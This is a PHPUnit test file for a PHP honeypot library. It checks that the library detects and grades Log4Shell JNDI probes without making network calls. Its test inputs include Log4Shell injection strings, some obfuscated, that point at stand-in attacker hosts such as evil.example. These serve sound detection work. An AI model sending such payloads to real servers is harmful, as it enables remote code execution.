<?php

declare(strict_types=1);

namespace Funnypot\Core\Tests;

use Funnypot\Core\Config;
use Funnypot\Core\Detection;
use Funnypot\Core\Honeypot;
use Funnypot\Core\Observer;
use Funnypot\Core\Outcome;
use Funnypot\Core\RequestContext;
use Funnypot\Core\SiteProfile;
use Funnypot\Core\Store\PhpArrayStore;
use Funnypot\Core\SynthesizedResponse;
use Funnypot\Core\Verdict;
use PHPUnit\Framework\TestCase;

/**
 * FP-0256 — the Log4Shell wiring (seam) tests. Log4ShellProbe was complete and tested but DEAD
 * CODE (nothing called it). This file proves the recovery: through the OobSignalRegistry, a
 * JNDI/log4shell spray now folds a signal-only Detection into classify()/respond() end-to-end —
 * with its own tags and severity split — without ever making a callback and without changing a
 * single served byte. Modeled on OastSeamTest (the invariant template the ticket names).
 *
 * The headline test (test_jndi_spray_yields_critical_signal_only_detection) FAILS on the baseline
 * (verdict CLEAN, detection empty — the "nothing calls Log4ShellProbe" hole) and PASSES after wiring.
 */
final class Log4ShellSeamTest extends TestCase
{
    /** The shipped compiled corpus (real routes + attack rules), as OastSeamTest uses it. */
    private function store(): PhpArrayStore
    {
        return new PhpArrayStore(require __DIR__ . '/../resources/compiled/nuclei-index.php');
    }

    private function engine(bool $attack = false): Honeypot
    {
        return new Honeypot($this->store(), new Config(
            'detect', null, 'matched-only', null, 'coherent',
            \Funnypot\Core\Response\Style::MINIMAL, 'high', 65536, 0, 0,
            $attack
        ));
    }

    /**
     * The dead-code-recovery proof. A plain JNDI spray in the User-Agent yields a signal-only,
     * critical, tagged, SCANNER_PROBE detection through the public classify(). FAILS on baseline
     * `6f554c3` (Log4ShellProbe unwired: verdict CLEAN, detection empty) — discharges AC #1.
     */
    public function test_jndi_spray_yields_critical_signal_only_detection(): void
    {
        $r = new RequestContext('GET', '/', '', ['User-Agent' => '${jndi:ldap://evil.example/a}']);
        $verdict = $this->engine()->classify($r, SiteProfile::empty());

        self::assertTrue($verdict->detection->matched);
        self::assertContains('log4shell', $verdict->detection->tags());
        self::assertContains('jndi', $verdict->detection->tags());
        self::assertContains('oob', $verdict->detection->tags());
        self::assertContains('log4shell-jndi', $verdict->detection->templateIds());
        self::assertSame('critical', $verdict->detection->highestSeverity);
        self::assertSame('critical', $verdict->severity);
        // A pure signal-only miss (null handle) is bumped CLEAN -> SCANNER_PROBE.
        self::assertSame(Verdict::SCANNER_PROBE, $verdict->classification);
        self::assertNull($verdict->fakeHandle);

        // The legacy detect() shim (classify against an empty profile) carries the same tag.
        self::assertContains('log4shell', $this->engine()->detect($r)->tags());
    }

    /**
     * The §8 severity split: a resolver-wrapped, obfuscated lookup that never names a byte-provable
     * scheme is RESOLVER/high (still SCANNER_PROBE, null handle), tagged resolver-only.
     */
    public function test_resolver_only_obfuscation_yields_high_severity(): void
    {
        $r = new RequestContext('GET', '/', '', ['X-Api-Version' => '${${lower:j}ndi:dns://x/y}']);
        $verdict = $this->engine()->classify($r, SiteProfile::empty());

        self::assertTrue($verdict->detection->matched);
        self::assertContains('log4shell', $verdict->detection->tags());
        self::assertContains('resolver-only', $verdict->detection->tags());
        self::assertContains('log4shell-resolver', $verdict->detection->templateIds());
        self::assertSame('high', $verdict->detection->highestSeverity);
        self::assertSame('high', $verdict->severity);
        self::assertSame(Verdict::SCANNER_PROBE, $verdict->classification);
        self::assertNull($verdict->fakeHandle);
    }

    /**
     * The cap-ordering fix: a >=16KB junk body must NOT push a header-borne JNDI payload past the
     * scan cap. FAILS on the baseline body-first builder (header truncated) — proves the fix.
     */
    public function test_jndi_in_header_detected_despite_16kb_junk_body(): void
    {
        $r = new RequestContext(
            'POST', '/nope', '',
            ['User-Agent' => '${jndi:ldap://evil.example/a}'],
            str_repeat('A', 16400)
        );
        $verdict = $this->engine()->classify($r, SiteProfile::empty());

        self::assertTrue($verdict->detection->matched);
        self::assertContains('log4shell', $verdict->detection->tags());
        self::assertSame('critical', $verdict->severity);
        self::assertSame(Verdict::SCANNER_PROBE, $verdict->classification);
    }

    /**
     * False-positive guard: a plain `${…}` template placeholder, a JS-template-literal URL, and a
     * benign redirect param raise NO log4shell detection and stay CLEAN/empty.
     */
    public function test_benign_dollar_brace_raises_no_log4shell_detection(): void
    {
        $cases = [
            new RequestContext('GET', '/', 'q=${price}+total'),
            new RequestContext('GET', '/', '', ['Referer' => 'https://cdn.example/app.js?v=${version}']),
            new RequestContext('GET', '/', 'next=https://example.com/dashboard'),
        ];
        foreach ($cases as $r) {
            $verdict = $this->engine()->classify($r, SiteProfile::empty());
            self::assertNotContains('log4shell', $verdict->detection->tags());
            self::assertSame(Verdict::CLEAN, $verdict->classification);
            self::assertTrue($verdict->detection->isEmpty());
        }
    }

    /**
     * Signal-only invariant: a Log4Shell-only spray under respond mode serves NOTHING (so nothing
     * that could be a callback) yet surfaces the signal to the Observer exactly once, and never
     * reports Outcome::SERVED. AC #2's "no serve => nothing that could be a callback".
     */
    public function test_log4shell_only_never_serves_and_never_calls_back(): void
    {
        $spy = $this->spy();
        $engine = new Honeypot($this->store(), $this->respondConfig(), $spy);

        $resp = $engine->respond(new RequestContext('GET', '/nope', '', ['User-Agent' => '${jndi:ldap://evil.example/a}']));

        self::assertNull($resp, 'a Log4Shell-only probe must serve nothing (no serve => no callback)');
        self::assertCount(1, $spy->detections, 'the signal must surface to onDetection exactly once');
        self::assertContains('log4shell', $spy->detections[0]->tags());
        self::assertNotContains(Outcome::SERVED, $spy->outcomes, 'nothing may be served off a Log4Shell-only probe');
    }

    /**
     * Served-byte identity: a routed decoy served twice — once plain, once with a JNDI header added —
     * is byte-identical (status, body, headers modulo the per-request X-Request-Id), while only the
     * Observer-side detection differs. AC #2. Catches the fold leaking into the served response.
     */
    public function test_log4shell_fold_does_not_change_served_bytes(): void
    {
        $store = $this->servingStore();

        $plainSpy = $this->spy();
        $plain = (new Honeypot($store, $this->respondConfig(), $plainSpy))
            ->respond(new RequestContext('GET', '/multi', 'a=1'));

        $jndiSpy = $this->spy();
        // JNDI added in a header only — never the path/query (would change route resolution) — and
        // the seed is a query-independent constant, so both runs pick the same persona.
        $jndi = (new Honeypot($store, $this->respondConfig(), $jndiSpy))
            ->respond(new RequestContext('GET', '/multi', 'a=1', ['X-Api-Version' => '${jndi:ldap://x/a}']));

        self::assertNotNull($plain);
        self::assertNotNull($jndi);
        self::assertSame($plain->status, $jndi->status);
        self::assertSame($plain->body, $jndi->body);
        self::assertSame($this->headersSansRequestId($plain), $this->headersSansRequestId($jndi));

        // ...yet the signal differs: the JNDI run carries the tag, the plain run does not.
        self::assertCount(1, $plainSpy->detections, 'the routed serve fires onDetection exactly once');
        self::assertCount(1, $jndiSpy->detections, 'no double-fire on the routed+JNDI path');
        self::assertNotContains('log4shell', $plainSpy->detections[0]->tags());
        self::assertContains('log4shell', $jndiSpy->detections[0]->tags());
    }

    /**
     * The CLEAN-with-route-handle seam on the generalized fold: a sig=1 root entry classifies CLEAN
     * with a route handle; a JNDI header folds the tag WITHOUT bumping to SCANNER_PROBE (handle
     * non-null), and respond() still declines NO_SIGNATURE. Mirrors OastSeamTest #4b.
     */
    public function test_log4shell_on_clean_root_handle_stays_clean(): void
    {
        $store = $this->rootHandleStore();

        $engine = new Honeypot($store, $this->engineConfig());
        $plain = $engine->classify(new RequestContext('GET', '/home', 'a=1'), SiteProfile::empty());
        self::assertSame(Verdict::CLEAN, $plain->classification);
        self::assertNotNull($plain->fakeHandle, 'the sig=1 root entry must resolve to a route handle');
        self::assertNotContains('log4shell', $plain->detection->tags());

        $jndi = $engine->classify(
            new RequestContext('GET', '/home', 'a=1', ['X-Api-Version' => '${jndi:ldap://x/a}']),
            SiteProfile::empty()
        );
        self::assertSame(Verdict::CLEAN, $jndi->classification, 'a CLEAN entry WITH a handle must NOT bump to SCANNER_PROBE');
        self::assertNotNull($jndi->fakeHandle, 'the handle must ride through untouched');
        self::assertContains('log4shell', $jndi->detection->tags());

        // respond(): both decline with NO_SIGNATURE (nothing served).
        $plainSpy = $this->spy();
        $plainResp = (new Honeypot($store, $this->respondConfig(), $plainSpy))
            ->respond(new RequestContext('GET', '/home', 'a=1'));
        $jndiSpy = $this->spy();
        $jndiResp = (new Honeypot($store, $this->respondConfig(), $jndiSpy))
            ->respond(new RequestContext('GET', '/home', 'a=1', ['X-Api-Version' => '${jndi:ldap://x/a}']));

        self::assertNull($plainResp);
        self::assertNull($jndiResp, 'a JNDI header on a CLEAN root handle must not cause a decoy serve');
        self::assertContains(Outcome::NO_SIGNATURE, $jndiSpy->outcomes, 'the JNDI run must still decline NO_SIGNATURE');
        self::assertNotContains(Outcome::SERVED, $jndiSpy->outcomes);
    }

    /**
     * The AMBIENT seam on the generalized fold (FP-0087): an amb=1 entry classifies AMBIENT with a
     * route handle; a JNDI header is request-level evidence the fetch was not an unprompted browser
     * fetch, so the fold bumps it to SCANNER_PROBE — handle untouched, route detection preserved,
     * folded match and critical ceiling on top. (Honeytoken retrieval delegates to the same fold.)
     */
    public function test_log4shell_on_ambient_entry_bumps_to_scanner_probe(): void
    {
        $store = new PhpArrayStore([
            'schema' => 1,
            'manifest' => [],
            'templates' => ['t-fav' => ['sev' => 'info', 'tags' => ['favicon'], 'name' => 'Favicon']],
            'routes' => [
                'GET /favicon.ico' => ['b' => [
                    ['s' => 200, 'bw' => ['ICO'], 'nf' => [], 'h' => [], 'pid' => 'p', 'sev' => 'info', 'sig' => 0, 'amb' => 1, 't' => ['t-fav']],
                ]],
            ],
        ]);
        $engine = new Honeypot($store, $this->engineConfig());

        $plain = $engine->classify(new RequestContext('GET', '/favicon.ico'), SiteProfile::empty());
        self::assertSame(Verdict::AMBIENT, $plain->classification);
        self::assertNotNull($plain->fakeHandle);
        self::assertNotContains('log4shell', $plain->detection->tags());

        $jndi = $engine->classify(
            new RequestContext('GET', '/favicon.ico', '', ['X-Api-Version' => '${jndi:ldap://x/a}']),
            SiteProfile::empty()
        );
        self::assertSame(Verdict::SCANNER_PROBE, $jndi->classification, 'an OOB witness on an ambient path is a probe');
        self::assertNotNull($jndi->fakeHandle, 'the handle must ride through untouched');
        self::assertSame($plain->fakeHandle->key, $jndi->fakeHandle->key);
        self::assertContains('log4shell', $jndi->detection->tags());
        self::assertContains('t-fav', $jndi->detection->templateIds(), 'route detection is preserved under the fold');
        self::assertSame('critical', $jndi->severity);
    }

    /**
     * Both probes fire on one request: a JNDI lookup whose LDAP host is an OAST collaborator zone
     * (`${jndi:ldap://a.oastify.com/p}`) folds TWO matches in fixed registry order (OAST then
     * Log4Shell), ceiling critical (high OAST ⊔ critical log4shell), one Verdict, null handle.
     * Also spot-checks determinism: two classify() calls yield identical toArray().
     */
    public function test_both_probes_fold_together_with_critical_ceiling(): void
    {
        $r = new RequestContext('GET', '/', 'x=${jndi:ldap://a.oastify.com/p}');
        $verdict = $this->engine()->classify($r, SiteProfile::empty());

        $tags = $verdict->detection->tags();
        self::assertContains('oast-callback', $tags);
        self::assertContains('log4shell', $tags);
        // Fixed registry order: OAST match first, then Log4Shell.
        self::assertSame(['oast-callback', 'log4shell-jndi'], $verdict->detection->templateIds());
        self::assertSame('critical', $verdict->detection->highestSeverity);
        self::assertSame('critical', $verdict->severity);
        self::assertSame(Verdict::SCANNER_PROBE, $verdict->classification);
        self::assertNull($verdict->fakeHandle);

        // Determinism: same request bytes => identical projection.
        $again = $this->engine()->classify($r, SiteProfile::empty());
        self::assertSame($verdict->toArray(), $again->toArray());
    }

    /**
     * Structural no-callback / no-I/O invariant for the whole new seam: the detect path source
     * (Log4ShellProbe, OobSignalRegistry, OobHaystack, and the foldOob slice of Honeypot) contains
     * no socket/DNS/fetch primitive.
     */
    public function test_detect_path_source_has_no_network_primitive(): void
    {
        $needles = [
            'fsockopen', 'curl_', 'file_get_contents', 'fopen', 'stream_socket',
            'gethostby', 'dns_get_record', 'checkdnsrr', 'socket_create',
        ];

        $files = [
            __DIR__ . '/../src/Log4ShellProbe.php',
            __DIR__ . '/../src/OobSignalRegistry.php',
            __DIR__ . '/../src/Support/OobHaystack.php',
        ];
        foreach ($files as $file) {
            $src = file_get_contents($file);
            self::assertNotFalse($src);
            foreach ($needles as $needle) {
                self::assertStringNotContainsString($needle, $src, "{$file} must not reference {$needle}");
            }
        }

        // The generalized fold body (foldOob) does only array/string work — assert the slice.
        $honeypot = file_get_contents(__DIR__ . '/../src/Honeypot.php');
        self::assertNotFalse($honeypot);
        $start = strpos($honeypot, 'private function foldOob');
        self::assertNotFalse($start);
        $end = strpos($honeypot, 'private function', $start + 1);
        self::assertNotFalse($end, 'foldOob must not be the last private method (else the slice guard is vacuous)');
        $body = substr($honeypot, $start, $end - $start);
        foreach ($needles as $needle) {
            self::assertStringNotContainsString($needle, $body, "foldOob must not reference {$needle}");
        }
    }

    // --- helpers -------------------------------------------------------------------------------

    /** The classify-mode Config used by engine(), for pairing with a custom store. */
    private function engineConfig(): Config
    {
        return new Config(
            'detect', null, 'matched-only', null, 'coherent',
            \Funnypot\Core\Response\Style::MINIMAL, 'high', 65536, 0, 0,
            false
        );
    }

    /** A single-bundle root/homepage-class (sig=1) route: classifies CLEAN with a KIND_ROUTE handle. */
    private function rootHandleStore(): PhpArrayStore
    {
        return new PhpArrayStore([
            'schema' => 1,
            'manifest' => [],
            'templates' => [
                't-root' => ['sev' => 'info', 'tags' => [], 'name' => 'Home'],
            ],
            'routes' => [
                'GET /home' => ['b' => [
                    ['s' => 200, 'bw' => ['HELLO'], 'nf' => [], 'h' => [], 'pid' => 'ph', 'sev' => 'info', 'sig' => 1, 't' => ['t-root']],
                ]],
            ],
        ]);
    }

    /** A multi-bundle route that reliably serves in respond mode (per GatingTest). */
    private function servingStore(): PhpArrayStore
    {
        return new PhpArrayStore([
            'schema' => 1,
            'manifest' => [],
            'templates' => [
                't-a' => ['sev' => 'low', 'tags' => ['exposure'], 'name' => 'A'],
                't-b' => ['sev' => 'low', 'tags' => ['exposure'], 'name' => 'B'],
            ],
            'routes' => [
                'GET /multi' => ['b' => [
                    ['s' => 200, 'bw' => ['AAA'], 'nf' => [], 'h' => [], 'pid' => 'pa', 'sev' => 'low', 'sig' => 0, 't' => ['t-a']],
                    ['s' => 200, 'bw' => ['BBB'], 'nf' => [], 'h' => [], 'pid' => 'pb', 'sev' => 'low', 'sig' => 0, 't' => ['t-b']],
                ]],
            ],
        ]);
    }

    /** Respond mode, gate open, query-independent constant seed (so persona is query-stable). */
    private function respondConfig(): Config
    {
        return new Config(
            'respond',
            static function (RequestContext $r): bool { return true; },
            'matched-only',
            static function (RequestContext $r): string { return 'seed-x'; },
            'coherent',
            \Funnypot\Core\Response\Style::MINIMAL,
            'high', 65536, 0, 0, false
        );
    }

    /** @param SynthesizedResponse $resp @return array<string,string> */
    private function headersSansRequestId(SynthesizedResponse $resp): array
    {
        $h = $resp->headers;
        unset($h['X-Request-Id']);

        return $h;
    }

    private function spy(): Observer
    {
        return new class implements Observer {
            /** @var Detection[] */
            public $detections = [];
            /** @var string[] */
            public $outcomes = [];

            public function onDetection(RequestContext $r, Detection $d): void
            {
                $this->detections[] = $d;
            }

            public function shouldRespond(RequestContext $r, Detection $d): bool
            {
                return true;
            }

            public function onOutcome(RequestContext $r, ?SynthesizedResponse $resp, string $reason): void
            {
                $this->outcomes[] = $reason;
            }
        };
    }
}
